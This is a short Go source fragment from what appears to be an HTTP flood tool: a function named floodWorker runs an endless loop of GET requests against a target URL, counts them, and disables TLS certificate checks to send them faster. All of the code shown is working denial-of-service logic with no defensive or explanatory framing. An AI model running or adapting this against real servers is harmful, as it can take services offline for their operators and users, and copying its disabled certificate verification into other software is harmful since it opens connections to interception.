package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
)

func floodWorker(id int, u url.URL) {
	defer func() {
		threadExit <- true
		if *verbose {
			fmt.Printf("Thread %x ended\n", id)
		}
	}()
	if *verbose {
		fmt.Printf("Thread %x started\n", id)
	}

	//Skip certificate verify for performance
	secureTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{}

	if u.Scheme == "https" {
		client = &http.Client{Transport: secureTransport}
	}

	for {
		client.Get(u.String())
		totalRequestsSent += 1
	}
}
